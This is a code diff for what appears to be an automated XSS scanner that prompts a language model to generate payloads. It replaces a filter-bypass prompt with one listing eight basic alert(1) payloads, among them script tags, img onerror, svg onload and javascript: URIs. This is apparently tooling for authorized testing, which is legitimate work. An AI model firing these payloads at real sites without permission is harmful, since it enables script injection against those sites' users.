@@ -29,13 +29,22 @@ Another example:
 """
 
 
-GENERATE_SYSTEM = """You generate XSS payloads for authorized penetration testing.
+GENERATE_SYSTEM = """You output XSS payloads for an authorized security scanner.
 
-Given REFLECTED, FILTERED, and BLOCKED payloads from previous rounds, generate NEW payloads to bypass the target's filters. Use encoding tricks, uncommon tags, event handler mutations, and case variations.
+Output 5 short, basic XSS payloads. Keep them simple and well-known. Do NOT explain, do NOT use markdown, do NOT wrap in code fences.
 
-Respond with ONLY valid JSON. No markdown, no code fences.
+Examples of the KIND of payloads to output (use these or small variations):
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)">
+"><script>alert(1)</script>
+<a href="javascript:alert(1)">x</a>
+<input onfocus=alert(1) autofocus>
 
-{"payloads": ["payload1", "payload2"], "strategy": "one sentence"}
+Respond with ONLY this JSON shape and nothing else:
+{"payloads": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"], "strategy": "basic"}
 """
 
 
@@ -155,30 +164,15 @@ Which category should we focus on next to maximize our chances of finding XSS? P
         if not self.history:
             return []
 
-        # Build compact context — keep it small for local models
-        reflected = [h for h in self.history if h["result"] == "reflected"]
-        filtered = [h for h in self.history if h["result"] == "filtered"]
-        blocked = [h for h in self.history if h["result"] == "blocked"]
+        # Minimal context — tiny models choke on long prompts.
+        # We only tell it what's already been tried so it doesn't repeat.
+        recent = [h["payload"] for h in self.history[-6:]]
+        already = "\n".join(f"  {p}" for p in recent) if recent else "  (none)"
 
-        context_lines = []
-        if reflected:
-            context_lines.append("REFLECTED (works):")
-            for h in reflected[-5:]:
-                context_lines.append(f"  {h['payload']}")
+        user_prompt = f"""Already tried:
+{already}
 
-        if filtered:
-            context_lines.append("FILTERED (mutate these):")
-            for h in filtered[-5:]:
-                context_lines.append(f"  {h['payload']}")
-
-        if blocked:
-            context_lines.append("BLOCKED (avoid):")
-            for h in blocked[-3:]:
-                context_lines.append(f"  {h['payload']}")
-
-        user_prompt = f"""{chr(10).join(context_lines)}
-
-Generate {count} new XSS payloads to bypass this target's filters."""
+Output {count} basic XSS payloads in the JSON format shown. Keep them short and simple."""
 
         messages = [
             {"role": "system", "content": GENERATE_SYSTEM},
